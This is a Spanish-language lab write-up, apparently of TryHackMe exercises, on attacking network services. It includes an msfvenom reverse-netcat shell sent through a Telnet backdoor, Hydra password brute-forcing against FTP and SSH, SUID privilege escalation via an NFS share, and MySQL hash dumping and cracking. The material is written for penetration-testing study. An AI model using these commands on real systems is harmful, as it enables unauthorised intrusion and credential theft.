	<img src="{{ 'assets/img/THM/Pasted image 20220712192146.png' | relative_url }}" text-align="center"/>
</div>

Y observar que existe un fichero que puede contener información interesante. Lo recuperamos con 'get':

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220712192217.png' | relative_url }}" text-align="center"/>
</div>

Y lo abrimos desde nuestra máquina. En él nos encontramos con que para que pueda trabajar desde casa conectándose con el servidor se le a autorizado el servicio SSH, por tanto, vamos al directorio .ssh y recuperamos las key para logearnos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220712192513.png' | relative_url }}" text-align="center"/>
</div>

Antes de proceder, intentamos acceder al id_rsa.pub para poder saber cuál es el nombre de la cuenta con

```bash
more id_rsa.pub
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220712194339.png' | relative_url }}" text-align="center"/>
</div>

Así, seleccionamos el id_rsa y lo llevamos a nuestro directorio .ssh y ahí extraemos la clave pública con el comando:

```bash
ssh-keygen -y -f ~/.ssh/id_rsa > ~/.ssh/id_rsa.pub
```

Y procedemos a logearnos mediante ssh con la cuenta anterior:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220712194557.png' | relative_url }}" text-align="center"/>
</div>

Sólo queda encontrar la flag:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220712194705.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 3.2. Telnet.

**Entendiendo Telnet**

Telnet es un servicio de estructura cliente-servidor que permite al cliente la ejecución remota de comandos en un host servidor telnet. Es decir, es un servicio de administración remota que opera sobre el puerto 23 comúnmente.

Al conectarse el cliente de Telnet se abrirá una terminal virtual que habilitará la interacción con el host servidor.

Es importante saber que Telnet no cifra los contenidos que envía, y que eso lo hace vulnerable a un ataque de Man-In-The-Middle. Por ello, este servicio está siendo reemplazado por SSH.

Telnet actúa introduciendo:

```bash
telnet <ip> <port>
```

<br />

**Enumerando Telnet**

Ya hemos visto cómo puede ser la enumeración de claves al explotar un servicio de red mal configurado. Sin embargo, las vulnerabilidades que podrían ser potencialmente triviales de explotar no siempre saltan a la vista. Por esa razón, especialmente cuando se trata de enumerar servicios de red, debemos ser minuciosos en nuestro método.

Comencemos de la misma manera que lo hacemos habitualmente, un escaneo de puertos, para encontrar la mayor cantidad de información posible sobre los servicios, aplicaciones, estructura y sistema operativo de la máquina de destino. Escanea la máquina con nmap.

En primer lugar, iniciamos la máquina y procedemos desde nuestra kali a hacer un escaneo de puertos convencional:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220713102103.png' | relative_url }}" text-align="center"/>
</div>

Aparentemente los 1000 puertos escaneados están cerrados. Procedemos por tanto a escanear todos los puertos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220713102334.png' | relative_url }}" text-align="center"/>
</div>

Comprobamos que existe uno abierto cuyo servicio no es capaz de identificar. Dado que necesitamos toda la información posible, volvemos a llevar a cabo un nmap con el modificador -A. De esta forma obtenemos que:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220713104025.png' | relative_url }}" text-align="center"/>
</div>

Es decir, que este puerto puede estar conteniendo una puerta trasera (backdoor) de un usuario llamado Skidy.

<br />

**Exploiting Telnet**

Telnet, al ser un protocolo, es en sí mismo inseguro por las razones que mencionamos anteriormente. Carece de cifrado, por lo que envía toda la comunicación en texto sin formato y, en su mayor parte, tiene un control de acceso deficiente. Sin embargo, existen CVE para los sistemas de cliente y servidor Telnet, por lo que al llevar a cabo la fase de exploiting puede verificarlos en:

- [https://www.cvedetails.com/](https://www.cvedetails.com/)
- [https://cve.mitre.org/](https://cve.mitre.org/)[](https://cve.mitre.org/)

Un CVE , (Common Vulnerabilities and Exposures) es una lista de fallas de seguridad informática divulgadas públicamente. Cuando alguien se refiere a un CVE, generalmente se refiere al número de identificación de CVE asignado a una falla de seguridad.

Sin embargo, es mucho más probable que encuentre una configuración incorrecta en la configuración o el funcionamiento de telnet que le permitirá explotarla.

Por tanto, vamos a hacer una recopilación de lo que hemos visto hasta ahora:

- Hay un servicio de Telnet pobremente ocultado corriendo en la máquina.
- El propio servicio está marcado como "backdoor".
- Tenemos un posible nombre de usuario implicado.

Vamos a emplear esta información para intentar generar una reverse shell en la máquina. En primer lugar, la sintaxis para conectarnos a telnet es la siguiente:

```bash
telnet <ip> <port>
```

Seguidamente, vamos a introducirnos en el concepto de una reverse shell.

- En primer lugar, una *shell* puede ser entendido como un programa o pieza de código que se puede emplear para poder llevar a cabo ejecución de comandos en un dispositivo.

De forma que en un caso normal un atacante se conectaría a una máquina víctima y le pediría que abriese una shell con la que podría ejecutar comandos.

- Una *reverse shell* es el caso contrario, un atacante consigue que una máquina víctima se conecte a la máquina atacante y le abra una shell de forma que el atacante puede ejecutar comandos en la máquina víctima.

Así, en primer lugar vamos a conectarnos al puerto de telnet que se encuentra abierto en la máquina remota.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220713142228.png' | relative_url }}" text-align="center"/>
</div>

Así, teclemos .HELP y observamos que podemos ejecutar cualquier comando con .RUN \<comand> pero sin embargo no obtenemos un output devuelta para el comando que hemos introducido:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220713142341.png' | relative_url }}" text-align="center"/>
</div>

Así, nos disponemos a saber si de verdad se están ejecutando comandos, para ello vamos a configurar un *tcpdump* que guarde el tráfico que vamos a lanzar nosotros desde la puerta trasera. Si llegan paquetes, entonces el comand se ejecuta:

```bash
sudo tcpdump ip proto \\icmp -i eth0
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220713143324.png' | relative_url }}" text-align="center"/>
</div>

Y emitimos un paquete ICMP con el comando ping:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220713143356.png' | relative_url }}" text-align="center"/>
</div>

Y observamos que efectivamente el TCPDUMP a obtenido un paquete:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220713143424.png' | relative_url }}" text-align="center"/>
</div>

Con lo que los comandos si se ejecutan. Así, para obtener mayor control sobre las acciones que ejecutamos dentro de la misma, lo que hacemos es construir una reverseshell con msfvenom:

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R
```

Al ejecutar el comando anterior, el programa MSFvenom nos dará un comando cuya ejecución en una máquina remota nos abrirá una conexión en nuestra máquina local y nos dará una shell (reverse shell).

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220713144620.png' | relative_url }}" text-align="center"/>
</div>

De forma que, acto seguido, abrimos el puerto 4444 en nuestra máquina para que escuche conexiones

```bash
nc -lvp 4444
```

y ejecutamos el comando que nos aporta MSFVenom en la máquina remota a través del backdoor:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220713144714.png' | relative_url }}" text-align="center"/>
</div>

Una vez ejecutado, nuestro puerto recibirá una conexión:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220713144842.png' | relative_url }}" text-align="center"/>
</div>

Y podremos empezar a ejecutar comandos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220713144859.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 3.3. FTP.

**Entendiendo FTP**

FTP son las siglas de File Transfer Protocol, se trata de un protocolo empleado en el transporte de ficheros entre dispositivos de una red. Emplea un modelo cliente-servidor. Opera comúnmente sobre el protocolo 21.

Una sesión FTP opera sobre dos canales separados:

- Comandos para transmitir instrucciones.
- Datos que se transmiten entre dispositivos por orden de instrucciones.

De forma que cuando la sesión cliente-servidor está abierta *el cliente ejecuta comandos FTP para subir u obtener la información que necesita del servidor*.

Esta separación de la información de los comandos y los datos en canales separados es una forma de poder enviar comandos al servidor sin tener que esperar a que finalice la transferencia de datos actual. *Si ambos canales estuvieran interconectados, solo podría ingresar comandos entre transferencias de datos*, lo que no sería eficiente ni para transferencias de archivos grandes ni para conexiones de Internet lentas.

Además, existen conexiones de dos tipos:

- *Conexión Activa*: El cliente abre un puerto y escucha mientras que el servidor se conecta al cliente.
- *Conexión Pasiva*: El cliente se conecta a un puerto en el que el servidor contiene una aplicación FTP escuchando.

Más información hacerca el FTP aquí: https://www.ietf.org/rfc/rfc959.txt

<br />

**Enumerando FTP**

Por ahora, no creo que necesite explicar más cómo la enumeración es clave cuando se atacan los servicios y protocolos de red.

A estas alturas, tenemos suficiente experiencia con nmap para poder escanear puertos de manera efectiva. Si se queda atascado usando alguna herramienta, siempre puede usar "\<tool>-h / -help / --help" para obtener más información sobre su función y sintaxis. Igualmente, las páginas "man" son extremadamente útiles para este propósito. Se pueden alcanzar usando "man \<tool>".

En este caso, vamos a explotar un logeo anónimo de FTP para ver qué ficheros pueden contener información que nos ayuden a desplegar una shell en la máquina víctima.

Así, lanzamos un Nmap sobre la máquina remota.

```bash
nmap -A -T5 -vv <ip>
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220713173107.png' | relative_url }}" text-align="center"/>
</div>

Observamos que tiene 2 puertos abiertos, y que en concreto tiene un servidor FTP escuchando en el puerto 21 cuya versión es vsftpd.

Intentamos llevar a cabo un logeo anonimo en el servidor FTP,

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220713175142.png' | relative_url }}" text-align="center"/>
</div>

Obtenemos acceso y listamos los contenidos, observamos que hay una nota con información y la descargamos con 'get':

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220713175645.png' | relative_url }}" text-align="center"/>
</div>

Al abrir la nota observamos una publicación informativa en la que encontramos un nombre:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220713175824.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Exploiting FTP**

Similarmente a como ocurría con Telnet, FTP tampoco cifra los datos que envía a través de la red. Cualquier dato enviado a lo largo de los canales de comandos o datos puede ser interceptado y leído. Esto abre una gran cantidad de vectores de ataque.

Nosotros sin embargo optaremos por, sabiendo que podemos tener un posible nombre de usuario, un ataque de fuerza bruta con *Hydra*.

Hydra es una herramienta de crakeo de contraseñas en línea muy rápida, que puede realizar ataques rápidos de diccionario contra más de 50 protocolos, incluidos Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, varias bases de datos y mucho más. Hydra viene de forma predeterminada tanto en Parrot como en Kali, sin embargo, puede encontrarse en GitHub: https://github.com/vanhauser-thc/thc-hydra

Lo que hace es llevar a cabo requests de logeo en batería y compara la respuesta para saber si ha tenido éxito o no.

De esta forma empleamos el siguiente comando:

```bash
hydra -t 4 -l <user> -P /usr/share/wordlists/rockyou.txt -vV <machine IP> <protocol>
```

- *hydra*: Ejecuta la herramienta hydra.
- *-t* : Número de hilos de ataque.
- *-l*: Especifica el nombre de usuario.
- *-P*: Especifica la lista a emplear como candidatos de contraseña.
- *-vV*: Verbose mode.
- \<machineIP>: La IP de la máquinad de destino.
- \<protocol>: El protocolo sobre el que se va a realizar nuestras requests.

Así, en primer lugar, nos aseguramos de tener descomprimido la lista rockyou.txt:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220713183849.png' | relative_url }}" text-align="center"/>
</div>

Y seguidamente ejecutamos el comando de hydra:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220713184041.png' | relative_url }}" text-align="center"/>
</div>

Ahora, vemos que la contaseña del usuario FTP cuyo nombre es mike es password y procedemos a logearnos en el servidor FTP con estas credenciales y obtener la flag:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220713184528.png' | relative_url }}" text-align="center"/>
</div>

Si hay alguna duda con los comandos que se pueden emplear, el '?' sirve para listar todos los comandos. El '!' sirve para ejecutar un comando en tu sistema operativo. Lo que se hace al final es obenet el ftp.txt y leerlo de nuestra propia máquina con '!cat ftp.txt'.

<br />

#### 3.4.NFS.

**Entendiendo NFS**

NFS son las siglas de *Network File System*, y permite a un sistema compartir directorios y ficheros con otros a través de una red. Opera normalmente sobre tcp/111 y udp/111.

Con NFS usuarios y programas pueden acceder a recursos remotos como si fueran recursos locales creando un punto de montaje para el sistema de ficheros del servidor en la máquina del cliente.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220713213629.png' | relative_url }}" text-align="center"/>
</div>

Montar un dispositivo (ya sea hardware o software) en una máquina consiste en volverlo accesible desde el sistema de ficheros de la máquina cliente.

La forma en la que opera NFS es la siguiente:

- En primer lugar, el cliente hará una request para montar un directorio en un host remoto. El servicio de montaje actúa llamando al Daemon RPC (Remote Procedure Call).

- El servidor comprueba si el cliente tiene permiso para realizar la request. Luego devolverá un identificador de archivo que identifica de forma única cada archivo y directorio que se encuentra en el servidor.

Así, si algo quiere acceder a un fichero a través de NFS, se hace una llamada RPC al daemon de NFS (NFSD), que contiene parámetros como los siguientes:

- El fichero pedido.
- El nombre del fichero al cual se desea acceder.
- El uid.
- El gid.

Estos datos se emplean para conocer si el agente tiene o no permisos para solicitar el recurso.

*Es decir, en resúmen, el cliente monta en un directorio de su sistema de ficheros un recurso compartido del servidor y cuando pide acceso a alguno de los elementos, el servidor se lo concede en base a si tiene o no permisos. La comunicación entre el servidor y el cliente se produce entre RPC.*

Por último, este servicio es multiplataforma y admite estructuras de cliente-servidor de plataforma cruzada.

<br />

**Enumeration NSF**

Para llevar a cabo una enumeración de un servidor NFS necesitamos unas cuantas herramientas más.

Para hacer una enumeración más avanzada del servidor NFS y los recursos compartidos, vamos a necesitar algunas herramientas. El primero de los cuales es clave para interactuar con cualquier recurso compartido NFS desde su máquina local: **nfs-common**. Este se puede instalar desde la apt y contiene muchos programas importantes.


El cliente necesita montar el contenido del servidor, esto es; necesita de un directorio en el que el contenido compartido por el servidor pueda estar alojado. En primer lugar habría que crear la carpeta y seguidamente aplicar el siguiente comando:

```bash
sudo mount -t nfs <IP>:share /tmp/mount -nolock
```

- sudo: Hacer como el usuario root.
- mount: Ejecutar el comando 'mount'.
- -t nfs: Tipo de dispositivo a montar. Se especifica que es NFS.
- \<IP>:share: Especifica la IP del servidor NFS y el nombre del recurso a compartir.
- -nolock: Especifica que no use NLM locking.

De esta forma, procedemos a realizar un escaneo de puertos con Nmap.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220714105418.png' | relative_url }}" text-align="center"/>
</div>

De entre los cinco puertos que tiene abiertos observamos que el contiene el servicio NFS que queremos enumerar es el 2049. Presumiblemente, escuchando en ese puerto tiene un servidor NFS dispuesto a compartir recursos contenidos en un share.

Así, para ver qué contenidos hay en el share del NFS server empleamos el comando:

```bash
showmont -e <IP>
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220714110430.png' | relative_url }}" text-align="center"/>
</div>

Con la finalidad de de acceder a los ficheros contenidos en el share /home, vamos a crear una carpeta en nuestra máquina y vamos a montar en ella los contenidos del servidor NFS.

```bash
mkdir /tmp/mount && sudo mount -t nfs <IP>:<share> /tmp/mount/ -nolock
```

En nuestro caso:

- IP: 10.10.189.82.
- share: /home

Así se tiene que accedemos al contenido del share:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220714125756.png' | relative_url }}" text-align="center"/>
</div>

Y observamos que podemos acceder al contenido de las llaves ssh del usuario 'cappucino'. Las movemos a nuestra carpeta personal y obteenmos la llave pública con la que nos logeamos en el máquina mediante ssh:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220714130346.png' | relative_url }}" text-align="center"/>
</div>

Sin embargo, no tenemos control total de la máquina debido a que tenemos una shell con pocos privilegios.

Por defecto en NFS shares el "root squashing" está habilitado y previene de cualquier usuario acceda al sistema como root.

Sin embargo, podemos aprovecharnos del sistema SUID, este es un protocolo de gestión de permisos por el cual es posible abrir/ejecutar un fichero con los permisos e identidad del usuario/propietario , concretamente; *Un archivo con SUID siempre se ejecuta como el usuario propietario del archivo, independientemente del usuario que pase el comando*. Estos vienen caracterizados por una 's' entre los permisos del usuario:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220714160506.png' | relative_url }}" text-align="center"/>
</div>

Así pues, el mecanismo es el siguiente, al ser nosotros root, podemos crear un script en bash que habra una terminal y subirlo al NFS Server y seguidamente, al ejecutarlo en la máquina remota, el archivo, al ser del usuario root, se ejecutará como root por el permiso especial SUID y habremos escalado privilegios obteniendo una shell como root.


Así, descargamos el ejecutable desde [aquí](https://github.com/TheRealPoloMints/Blog/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash), lo movemos al directorio cappucino y le cambiamos la propiedad y los permisos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220714171836.png' | relative_url }}" text-align="center"/>
</div>

De forma que como última comprobación listamos los contenidos de capuccino y comprobamos que el fichero está y que puede ser ejecutado adecuadamente:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220714171934.png' | relative_url }}" text-align="center"/>
</div>

Así, nos volvemos a logear a la cuenta a través de ssh y ejecutamos el archivo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220714172537.png' | relative_url }}" text-align="center"/>
</div>

al ejecutarlo con '-p' mantenemos los permisos.

<br />

#### 3.5. SMTP.

**Entendiendo STMP**

SMTP son las siglas que atienden a "Simple Mail Transfer Protocol" y se trata de un protocolo de envío de emails. Para llevar a cabo una adecuada gestión de emails en una máquina también se necesita otro protocolo concomitante al primero que es o bien POP3 o IMAP. Corre sobre el puerto 25 usualmente.

SMTP cumple con tres grandes funciones:

- Verifica quién manda los emails.
- Manda emails.
- Si el email no se puede enviar correctamente devuelve el mensaje al emisor.

POP, o "Protocolo de oficina de correos" e IMAP, "Protocolo de acceso a mensajes de Internet" son protocolos de correo electrónico que son responsables de la transferencia de correo electrónico un servidor de correo y el cliente, es decir, reciben correos. Las principales diferencias están en el enfoque más simple de POP de descargar la bandeja de entrada desde el servidor de correo al cliente. Mientras que IMAP sencillamente actualiza la bandeja de entrada cada vez que hay algo nuevo.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220714215042.png' | relative_url }}" text-align="center"/>
</div>

Veamos ahora cómo trabaja SMTP.

La forma en la que trabaja la mensajería digital es muy parecida a la mensajería física.

El usuario deberá de proporcionar el email (la carta) y un servicio a través del cual se mandará la carta (servicio de reparto de mensajería) y la carta pasa por un procedimiento que culmina con la misma en el "inbox" o caja de recogidas. Precisamente, trasladado al ámbito digital, el protocolo SMTP asume el rol del servicio que repartíra la carta.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220714221641.png' | relative_url }}" text-align="center"/>
</div>

Concretamente, la carta sigue los siguientes pasos:

- El "mail user agent" se conecta al *SMTP server* de tu dominio. Esto inicia el *SMTP handshake* que abre la sesión. Esta conexión comienza sobre el puerto 25 del servidor SMTP.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220714223646.png' | relative_url }}" text-align="center"/>
</div>

- Ahora el proceso de mandar un email puede comenzar. En primer lugar, el cliente en primer lugar primero emite el emisor y el recipiente del email al servidor.

- El servidor SMTP del emisor realiza una conexión al servidor SMTP del receptor antes de liberar el mensaje. Si el servidor SMTP del recipiente no está disponible, el email se pone a la cola.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220715101249.png' | relative_url }}" text-align="center"/>
</div>

- El servidor SMTP del receptor verificará el email entrante mediante el análisis del nombre de usuario y el dominio y seguidamente reenviará el email al servidor POP3/IMAP.

- Seguidamente, el email aparecerá en la bandeja de entrada del receptor.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220715102633.png' | relative_url }}" text-align="center"/>
</div>

SMTP tiene variantes capaz de correr tanto en Windows como en Linux.

<br />

**Enumerating SMTP**

Los servidores poobremente configurados o vulnerables pueden proporcionar un buen punto de apoyo inicial a la hora de penetrar en una red. Pero antes de eso conviene recabar la máxima información posible del servidor para hacer el ataque lo más preciso posible.

Para ello, vamos a emplear el modulo "smtp_version" de la herramienta Metasploit, este modulo escaneará un rango de direcciones IPs y determinará la versión de cualquier servidor mail que encuentre.

Por otra parte además, el SMTP como servicio tiene dos comandos internos que permite la enumeración de usuarios:

- *VRFY*; que nos permite confirmar usernames válidos.
- *EXPN*; que revela la dirección real de los alias del usuario y las listas de correo electrónico.

Con estos comandos podemos explorar el servidor de manera manual con un servicio como Telnet. Pero dado que estamos utilizando Metasploit, podemos emplear otro modulo denominado "smtp_enum" que hará el trabajo duro por nosotros.

En primer lugar, comprobamos que tenemos la base de datos asociado a Metasploit instalada y activa:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220715131122.png' | relative_url }}" text-align="center"/>
</div>

Y ejecutamos el entorno de metasploit:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220715131718.png' | relative_url }}" text-align="center"/>
</div>

El comando empleado es msfconsole para abrir la consola de metasploit, -x para abrirla ejecutando un comando que será db_status para comprobar que la base de datos está correctamente activada y conectada.

Seguidamente, hacemos un nmap de la máquina explorando todos los puertos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220715134746.png' | relative_url }}" text-align="center"/>
</div>

Un escaneo más profundo con -sV nos proporciona las versiones de las aplicaciones que escuchan tras ambos puertos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220715135031.png' | relative_url }}" text-align="center"/>
</div>

Acudimos de vuelta a metasploit y buscamos el módulo "smtp_version" con: *search smtp* y obtenemos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220715135315.png' | relative_url }}" text-align="center"/>
</div>

Usamos el modulo con 'use 8' y listamos las opciones con 'options':

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220715141149.png' | relative_url }}" text-align="center"/>
</div>

Observamos que falta un parámetro por setear, lo configuramos y lanzamos el modulo obteniendo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220715142852.png' | relative_url }}" text-align="center"/>
</div>

Cuyo MTA (mail transfer agent) es Postfix.

Ahora procedemos a hacer una enumeración de usuarios dentro de la base de datos. Para ello empleamos de nuevo un módulo de Metasploit llamado "smtp_enum", con una lista llamada "top-usernames-shorlist.txt" que puede ser descarga desde [aquí](https://github.com/danielmiessler/SecLists)

De esta forma, con Metasploit buscamos el módulo, lo cargamos y comprobamos las opciones y configuramos los parámetros USER_FILE y RHOSTS:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220715164759.png' | relative_url }}" text-align="center"/>
</div>

Y ejecutamos el modulo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220715164823.png' | relative_url }}" text-align="center"/>
</div>

El nombre devuelto es administrator.

<br />

**Exploiting SMTP**

En el apartado anterior culminamos el proceso de enumeración y en él obtuvimos un nombre de usuario, un tipo de servidor SMTP y un sistema operativo corriendo.

El único otro puerto abierto es el puerto ssh, podemos, a sabiendas de que tenemos un nombre de usuario, un ataque de fuerza bruta con Hydra. Para ello emplearemos la lista "rockyou.txt" que puede descargarse desde [aquí](https://github.com/vanhauser-thc/thc-hydra).

Emplearemos el siguiente comando con hydra:

```bash
hydra -t 16 -l <username> -P /usr/share/wordlists/rockyou.txt -vV <IP> <protocol>
```

- *hydra*: Llama al comando hydra.
- *-t*: Designa el número de hilos.
- *-l*: Designa el string que se empleará como candidato de nombre.
- *-P*: Desgina la ruta de la lista de candidatos de posibles contraseñas.
- *-vV*: Verbose.
- *\<IP>*: La dirección IP de la máquina de destino.
- *\<protocol>*: Designa el protocolo mediante el que se realizaran las request de fuerza bruta. En este caso ssh.


De forma que finalmente obtenemos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220715173411.png' | relative_url }}" text-align="center"/>
</div>

Nos logeamos y obtenemos la flag:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220715173516.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 3.6. MySQL.

**Entendiendo MySQL**

MySQL es un sistema gestor de base de datos basado en el lenguaje de SQL.

- Una *base de datos* es una colección ordenada de datos.
- Un *RDBMS* es un software/servicio empleado para manejar bases de datos relacionales.
- El MYSQL es solo una marca de una de las implementaciones de software RDBMS más populares. Como sabemos, utiliza un modelo cliente-servidor. Pero, ¿cómo se comunican el cliente y el servidor? Utilizan un lenguaje, concretamente el *lenguaje de consulta estructurado (SQL)*.

MySQL funciona como RDBMS en un servidor administrando las bases de datos. El servidor maneja las instrucciones de manejo referidas a crear, editar, acceder a los datos, etc mediante los siguientes pasos:

- MySQL alberga bases de datos con tablas.
- Los clientes llevan a cabo requests con las que interactúan con la tablas del servidor.
- El servidor recibirá la request y procesará la instrucción del cliente.

MySQL puede correr sobre Linux o Windows.

<br />

**Enumerating MySQL**

Es probable que MySQL no sea el primer punto de partida al obtener información inicial sobre un servidor. Podemos intentar aplicar fuerza bruta a las contraseñas de las cuentas predeterminadas pero usualmente este no será el primer paso.

Por lo general, habrá obtenido algunas credenciales iniciales al enumerar otros servicios que luego puede usar para enumerar y explotar el servicio MySQL. Como esta sala se enfoca en explotar y enumerar el servicio de red, por el bien del escenario, supondremos que encontró las credenciales: "root:password" mientras enumeraba los subdominios de un servidor web. Después de intentar el inicio de sesión contra SSH sin éxito, decide intentarlo contra MySQL.

Debemos tener instalado un cliente de MySQL lo cual puede garantizarse con el siguiente comando:

```bash
sudo apt install default-mysql-client
```

Así, procedemos a llevar a cabo un escaneo de puertos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220715195020.png' | relative_url }}" text-align="center"/>
</div>

Observamos que en el puerto 3306 hay escuchando un servidor MySQL, con las credenciales que hemos obtenido en enumearciones anteriores (root:password) procedemos a intentar logearnos con el cliente MySQL mediante el siguiente comando:

```bash
mysql -h <IP> -u <username> -p
```

De esta forma nos logeamos y obtenemos el acceso:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220715200134.png' | relative_url }}" text-align="center"/>
</div>

Seguidamente acudimos a Metasploit y utilizamos el modulo "mysql_sql". El módulo mysql_sql realiza consultas SQL en un servidor remoto cuando se le proporciona un conjunto válido de credenciales.

Buscamos el modulo y ajustamos las opciones correctamente:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220715201356.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220715201431.png' | relative_url }}" text-align="center"/>
</div>

Y lanxamos el modulo. Observamos que el comando que se ejecuta viene dado por un parámetro, SQL, que ahora mismo está configurado para extraer la versión de la base de datos.

Ahora, cambiamos el valor de SQL a "show databases":

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220715201705.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Exploiting MySQL**

Antes de continuar debemos de tener en cuenta los siguientes conceptos:

- *schema*: Un esquema es una base de datos.
- *hashes*: Un hash es el producto de un algoritmo criptográfico.

Lo que vamos a extraer son los hashes de las contraseñas, con los que tendremos la posibilidad de recueperar las credenciales de los usuarios que emplean la base de datos.

Así, en Metasploit buscamos el módulo "mysql_hashdump", vamos a buscarlos, setearl las opciones necesarias y correr el exploit:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220715203350.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, se tiene que hemos encontrado un usuario nuevo. Vamos a intentar crackear esta contraseña con john_theripper.

Copiamos la contraseña en un fichero "file.txt" y ejecutamos johnTheripper pasándole ese fichero como argumento:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220715203857.png' | relative_url }}" text-align="center"/>
</div>

Hemos obtenido la contraseña de este usuario en MySQL, puede ser que reutilice las contraseñas en cuyo caso, quizá podamos acceder a su usuario a través de ssh con la misma contraseña:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220715204041.png' | relative_url }}" text-align="center"/>
</div>

<br />

### 4. Criptografía.

#### 4.1 Crypto 101.

**Términos clave**

A continuación se presentan un conjunto de términos clave a entender a la hora de hablar sobre criptografía:

- *Plaintext*: Son los datos antes de ser procesador por un algoritmo de cifrado.

- *Codificar*: Se trata de una representación de datos inmediatamente reversible, no es una forma de cifrado. La principal diferencia es que para decodificar datos se puede emplear el mismo algoritmo que se ha utilizado para codificarlos mientras que en el cifrado esto no es posible, se ha de emplear el algoritmo inverso al que se ha utilizado para cifrar dichos datos.

- *Hash*: Un hash es el resultado que se obtiene de pasar unos datos por una función de hash.

- *Bruteforce*: Se trata de un mecanismo de crakeo que tiene por objeto probar diferentes contraseñas o candidatos a claves de descifrado para ver si alguna coincide.

- *Criptoanálisis*: Ataque a una clave criptográfica buscándo debilidades en su estructura matemática.

<br />

**Función de Hash**

Las *funciones hash* son bastante diferentes del cifrado. No hay clave de cifrado, y se supone que es imposible (o muy, muy difícil) volver de los datos de salida a los originales.

Una función hash toma algunos datos de entrada de cualquier tamaño y crea un resumen (digest) de esos datos (Es importante observar que con el cifrado/codificado la información se conserva pero transformada, sin embargo en el hash, la información no está completa por lo que teóricamente no es posible recuperarla). La salida tiene un tamaño fijo. Es difícil predecir cuál será la salida para cualquier entrada y viceversa. Los buenos algoritmos hash serán (relativamente) rápidos de calcular y lentos de revertir (pasar de la salida y determinar la entrada). Cualquier pequeño cambio en los datos de entrada (incluso un solo bit) debería causar un gran cambio en la salida.

La salida de una función hash normalmente son bytes sin formato, que luego se codifican. Las codificaciones comunes para esto son base 64 o hexadecimal.

